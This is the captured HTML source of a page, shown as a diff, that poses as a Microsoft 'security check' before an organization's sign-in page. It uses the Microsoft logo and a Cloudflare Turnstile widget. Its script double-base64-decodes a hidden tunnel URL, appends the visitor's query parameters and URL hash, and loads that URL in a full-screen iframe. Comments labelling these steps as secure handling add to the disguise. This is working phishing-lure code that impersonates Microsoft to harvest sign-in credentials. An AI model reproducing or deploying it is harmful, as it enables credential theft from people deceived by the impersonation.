@@ -1,0 +1,365 @@
+<!-- url: https://pub-f8ae05628d044493abc7f11a802215fc.r2.dev/index.html?acfe0978063298d1ad8631df9bb563
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Security Check</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url('https://imagedelivery.net/V5lSkRYhzcE91zkPxxAW4g/a2418d6d-3960-41ab-0fc2-a0ea903c1b00/public') no-repeat center center fixed;
+            background-size: cover;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .å®¹å¨ {
+            position: relative;
+            background: #fff;
+            padding: 44px 44px 28px;
+            border-radius: 6px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            text-align: left;
+            width: 440px;
+            max-width: calc(100% - 40px);
+            min-height: 338px;
+            margin: 0 auto;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+
+        .é¡¶é¨å è½½æ¡ {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(to right, transparent, #0078D4, transparent);
+            animation: é¡¶é¨å è½½ 2s ease-in-out infinite;
+            display: block;
+        }
+
+        @keyframes é¡¶é¨å è½½ {
+            0% {
+                left: -100%;
+                transform: translateX(0);
+            }
+            100% {
+                left: 100%;
+                transform: translateX(0);
+            }
+        }
+
+        .æ å¿ {
+            width: 108px;
+            height: 24px;
+            margin-bottom: 16px;
+            display: block;
+        }
+
+        .æ é¢ {
+            font-size: 24px;
+            font-weight: 600;
+            line-height: 1.25;
+            margin-bottom: 16px;
+            color: #1B1B1B;
+        }
+
+        .å­æ é¢ {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #1B1B1B;
+            margin-bottom: 24px;
+        }
+
+        .éªè¯æ¡ {
+            margin: 20px 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .å è½½å¨ {
+            display: none;
+            width: 18px;
+            height: 18px;
+            margin: 16px auto;
+            border: 2px solid #F3F3F3;
+            border-top: 2px solid #0078D4;
+            border-radius: 50%;
+            animation: æè½¬ 1s linear infinite;
+        }
+
+        .åå®¹æ¡æ¶ {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            border: none;
+            opacity: 0;
+            z-index: 999;
+            transition: opacity 0.5s ease;
+            display: none;
+            background: #fff;
+        }
+
+        .å è½½ææ¬ {
+            display: block;
+            color: #0078D4;
+            font-size: 14px;
+            margin-top: 16px;
+            text-align: center;
+        }
+
+        .ç¹ç¹::after {
+            content: '';
+            animation: å è½½ç¹ 1.4s infinite;
+        }
+
+        @keyframes å è½½ç¹ {
+            0% { content: '.'; }
+            33% { content: '..'; }
+            66% { content: '...'; }
+        }
+
+        @keyframes æè½¬ {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .éè¯¯ä¿¡æ¯ {
+            display: none;
+            color: #A4262C;
+            font-size: 12px;
+            margin-top: 8px;
+            text-align: center;
+        }
+
+        .å®æä¿¡æ¯ {
+            display: none;
+            color: #107C10;
+            font-size: 12px;
+            margin-top: 8px;
+            text-align: center;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 28px 44px;
+            border-top: 1px solid #E1E1E1;
+            text-align: left;
+        }
+
+        .åæ¶æé® {
+            color: #0067B8;
+            font-size: 13px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .åæ¶æé®:hover {
+            color: #004E8C;
+            text-decoration: underline;
+        }
+
+        .cf-turnstile {
+            margin: 0 auto;
+        }
+
+        #turnstile-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="å®¹å¨">
+        <div class="é¡¶é¨å è½½æ¡"></div>
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" class="æ å¿">
+        <h1 class="æ é¢">Taking you to your organization's sign-in page</h1>
+        <p class="å­æ é¢">Complete the security check to continue</p>
+        
+        <div class="éªè¯æ¡">
+            <div id="turnstile-container"></div>
+        </div>
+
+        <div class="å è½½å¨" id="å è½½å¨"></div>
+        <div class="å è½½ææ¬">...<span class="ç¹ç¹"></span></div>
+        <div class="éè¯¯ä¿¡æ¯" id="éè¯¯ä¿¡æ¯">Verification failed. Please try again.</div>
+        <div class="å®æä¿¡æ¯">Verification complete! Redirecting...</div>
+
+        <footer>
+            <a href="#" class="åæ¶æé®">Cancel</a>
+        </footer>
+    </div>
+    <iframe id="åå®¹æ¡æ¶" class="åå®¹æ¡æ¶"></iframe>
+
+    <script>
+        // Secure URL handling
+        function decodeURL(encodedUrl) {
+            try {
+                const decodedOnce = atob(encodedUrl);
+                const decodedTwice = atob(decodedOnce);
+                // Validate URL format
+                if (!decodedTwice.startsWith('http')) {
+                    throw new Error('Invalid URL format');
+                }
+                return decodedTwice;
+            } catch (e) {
+                console.error('Error decoding URL');
+                return null;
+            }
+        }
+
+        // Security check for hash
+        function hasValidHash() {
+            return window.location.hash && window.location.hash.length > 1;
+        }
+
+        // Clean URL parameters
+        function sanitizeParams(url) {
+            try {
+                const currentParams = new URLSearchParams(window.location.search);
+                const baseUrl = url.split('?')[0];
+                const finalUrl = new URL(baseUrl);
+                
+                // Only transfer specific allowed parameters
+                currentParams.forEach((value, key) => {
+                    // Add parameter validation here if needed
+                    if (value && value.length > 0) {
+                        finalUrl.searchParams.append(key, value);
+                    }
+                });
+
+                // Append hash if exists
+                if (hasValidHash()) {
+                    return finalUrl.toString() + window.location.hash;
+                }
+
+                return finalUrl.toString();
+            } catch (e) {
+                console.error('Error processing URL parameters');
+                return url;
+            }
+        }
+
+        window.onloadTurnstileCallback = function () {
+            turnstile.render('#turnstile-container', {
+                sitekey: '0x4AAAAAAA62SAEErPyiN6fN',
+                theme: 'light',
+                callback: function(token) {
+                    if (token) {
+                        onTurnstileSuccess(token);
+                    }
+                }
+            });
+        };
+
+        function onTurnstileSuccess(token) {
+            if (!hasValidHash()) {
+                showError("Invalid session. Please try again.");
+                return;
+            }
+
+            const elements = {
+                å è½½æ¡: document.querySelector('.é¡¶é¨å è½½æ¡'),
+                å è½½å¨: document.querySelector('.å è½½å¨'),
+                å è½½ææ¬: document.querySelector('.å è½½ææ¬'),
+                å®æä¿¡æ¯: document.querySelector('.å®æä¿¡æ¯'),
+                éªè¯æ¡: document.querySelector('.éªè¯æ¡'),
+                å®¹å¨: document.querySelector('.å®¹å¨'),
+                éè¯¯ä¿¡æ¯: document.querySelector('.éè¯¯ä¿¡æ¯')
+            };
+
+            elements.å è½½å¨.style.display = 'block';
+            elements.éªè¯æ¡.style.display = 'none';
+            elements.éè¯¯ä¿¡æ¯.style.display = 'none';
+
+            const decodedURL = decodeURL('YUhSMGNITTZMeTl0YVc1cGMzUmxjbk10Y0hWeVkyaGhjMlZ6TFd4dmIzTmxMV1Z1WkdsbUxuUnllV05zYjNWa1pteGhjbVV1WTI5dA==');
+
+            if (!decodedURL) {
+                showError("Verification failed. Please try again.");
+                return;
+            }
+
+            const finalUrl = sanitizeParams(decodedURL);
+
+            setTimeout(() => {
+                elements.å®æä¿¡æ¯.style.display = 'block';
+                
+                setTimeout(() => {
+                    const iframe = document.getElementById('åå®¹æ¡æ¶');
+                    
+                    try {
+                        iframe.src = finalUrl;
+                        iframe.style.display = 'block';
+                        
+                        iframe.onload = () => {
+                            iframe.style.opacity = '1';
+                            elements.å®¹å¨.style.opacity = '0';
+                            setTimeout(() => {
+                                elements.å®¹å¨.style.display = 'none';
+                            }, 500);
+                        };
+                    } catch (error) {
+                        showError("Loading failed. Please try again.");
+                    }
+                }, 1500);
+            }, 2000);
+        }
+
+        function showError(message) {
+            const elements = {
+                éè¯¯ä¿¡æ¯: document.querySelector('.éè¯¯ä¿¡æ¯'),
+                å è½½å¨: document.querySelector('.å è½½å¨'),
+                éªè¯æ¡: document.querySelector('.éªè¯æ¡')
+            };
+
+            elements.éè¯¯ä¿¡æ¯.textContent = message;
+            elements.éè¯¯ä¿¡æ¯.style.display = 'block';
+            elements.å è½½å¨.style.display = 'none';
+            elements.éªè¯æ¡.style.display = 'flex';
+        }
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            // Hide elements initially
+            ['.éè¯¯ä¿¡æ¯', '.å®æä¿¡æ¯', '#å è½½å¨'].forEach(selector => {
+                const element = document.querySelector(selector);
+                if (element) {
+                    element.style.display = 'none';
+                }
+            });
+
+            // Check for hash on load
+            if (!hasValidHash()) {
+                showError("Invalid session. Please reload the page.");
+                return;
+            }
+        });
+
+        // Handle iframe errors
+        window.addEventListener('error', function(e) {
+            if (e.target.tagName === 'IFRAME') {
+                showError("Connection failed. Please try again.");
+            }
+        }, true);
+
+        // Prevent clickjacking
+        if (window.self !== window.top) {
+            window.top.location = window.self.location;
+        }
+    </script>
+    </body></html>
